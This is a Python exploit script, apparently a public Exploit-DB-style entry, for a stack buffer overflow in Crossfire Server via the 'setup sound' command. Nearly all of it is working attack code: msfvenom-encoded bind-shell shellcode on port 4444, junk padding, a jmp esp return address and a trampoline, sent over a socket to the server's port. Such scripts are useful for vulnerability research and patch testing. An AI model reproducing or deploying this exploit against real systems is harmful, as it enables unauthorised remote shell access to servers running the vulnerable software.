#!/usr/bin/python

# Exploit Title: Crossfire Server - Stack Based Buffer Overflow (Setup Sound)
# Date: 2015 - 04 - 03
# Exploit Author: feci
# Version: 1023 1027 Crossfire Server
# Tested on: Linux

import socket

# msfvenom -p linux/x86/shell_bind_tcp RPORT=4444 -e x86/shikata_ga_nai -b "\x00\x20" -f python
# No platform was selected, choosing Msf::Module::Platform::Linux from the payload
# No Arch selected, selecting Arch: x86 from the payload
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 105 (iteration=0)
buf = "\xdb\xd5\xbe\xb6\xb7\x2a\x67\xd9\x74\x24\xf4\x5f\x2b"
buf += "\xc9\xb1\x14\x83\xc7\x04\x31\x77\x15\x03\x77\x15\x54"
buf += "\x42\x1b\xbc\x6f\x4e\x0f\x01\xdc\xfb\xb2\x0c\x03\x4b"
buf += "\xd4\xc3\x43\xf7\x47\x8e\x2b\x0a\x78\x3f\xf7\x60\x68"
buf += "\x6e\x57\xfc\x69\xfa\x31\xa6\xa4\x7b\x34\x17\x33\xcf"
buf += "\x42\x28\x5d\xe2\xca\x0b\x12\x9a\x07\x0b\xc1\x3a\xfd"
buf += "\x33\xbe\x71\x81\x05\x47\x72\xe9\xba\x98\xf1\x81\xac"
buf += "\xc9\x97\x38\x43\x9f\xbb\xea\xc8\x16\xda\xba\xe4\xe5"
buf += "\x9d"
buf += "\x41" * (4368 - 105) # junk
buf += "\x97\x45\x13\x08" # ret address 08134597 jmp esp
buf += "\x83\xC0\x0C\xFF\xE0" # 83C00CFFE0 add eax,0x0c jmp eax
buf += "\x90" * 4

buffer = "\x11(setup sound " + buf
host = "127.0.0.1"
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Sending buf"
try:
	connect = s.connect((host,13327))
	data = s.recv(1024)
	print data
	s.send(buffer)
	print "[+] Payload sent"
except:
	print "[+] Can't connect"
	s.close()
